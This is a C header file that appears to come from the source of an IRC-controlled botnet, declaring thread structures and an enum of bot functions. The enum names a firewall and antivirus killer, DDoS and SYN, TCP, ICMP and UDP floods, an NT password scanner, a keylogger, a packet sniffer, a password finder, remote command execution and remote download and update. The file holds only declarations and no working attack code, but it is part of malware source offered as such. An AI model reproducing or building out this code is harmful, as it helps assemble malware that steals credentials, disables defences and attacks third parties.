#pragma once

#include "define.h"
#include "includes.h"

enum ThreadID  {
	MAIN_THREAD,		// Main thread 
	KILLER_THREAD,		// Firewall/AV Killer thread
	IDENT_THREAD,		// Ident Server thread
	HTTP_THREAD,		// HTTP Server thread
	TFTP_THREAD,		// TFTP Server thread
	FTP_THREAD,			// FTP Server thread
	RLOGIN_THREAD,		// Rlogin Server thread
	RCMD_THREAD,		// Remote CMD thread
	SCAN_THREAD,		// Port Scanner thread
	NTPASS_THREAD,		// NT Password Scanner thread
	DDOS_THREAD,		// DDoS thread
	SYN_THREAD,			// Syn Flood thread
	TCP_THREAD,			// Tcp Flood thread
	ICMP_THREAD,		// ICMP Flood thread
	PING_THREAD,		// Ping thread
	UDP_THREAD,			// UDP thread
	REDIRECT_THREAD,	// Port Redirect thread
	SOCKS4_THREAD,		// SOCKS4 thread
	DCC_THREAD,			// DCC Transfer thread
	DCCCHAT_THREAD,		// DCC Chat Transfer thread
	VISIT_THREAD,		// Visit URL thread
	DOWNLOAD_THREAD,	// Download thread
	UPDATE_THREAD,		// Update thread
	CLONE_THREAD,		// Clone thread
	PSNIFF_THREAD,		// Psniff thread
	SECURE_THREAD,		// Secure thread
	KEYLOG_THREAD,		// Key Logger thread
	FIND_THREAD,		// File find thread
	LOG_THREAD,			// Log list thread
	PASS_THREAD,		// Find pass thread
	PROC_THREAD,		// Process list thread
	LIST_THREAD			// Threads list thread
};

typedef struct THREAD 
{
   char name[BUFFSIZE];
   int id; 
   int parent;
   DWORD pid;
   HANDLE tHandle;

} THREAD;

typedef struct TLIST
{
	int threadnum;
	bool full;
	bool notice;
	bool silent;
	bool gotinfo;

} TLIST;


int addthread(char *name, int id);
DWORD WINAPI ListThread(LPVOID param);
void listthreads(bool notice, bool full=FALSE);
bool killthread(int threadnum);
int killthreadall(void);
int killthreadid(int threadid, int threadnum=0);
int findthreadid(int threadid);
int findthreadnum(int threadid);
void stopthread(bool notice, bool silent, char *name, char *desc, int threadid, char *thread);
void clearthread(int threadnum);

extern THREAD threads[MAXTHREADS];
extern int killProcess(int pid);